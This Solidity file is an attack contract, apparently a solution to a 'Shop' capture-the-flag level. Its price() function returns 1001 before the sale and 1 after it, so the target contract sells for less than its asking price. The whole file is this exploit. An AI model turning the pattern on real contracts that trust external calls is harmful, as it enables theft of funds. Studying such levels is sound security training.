// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {
    Shop shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function attack() public {
        shop.buy();
    }

    function price () external view returns (uint) {
        return shop.isSold() ? 1 : 1001;
    }
}
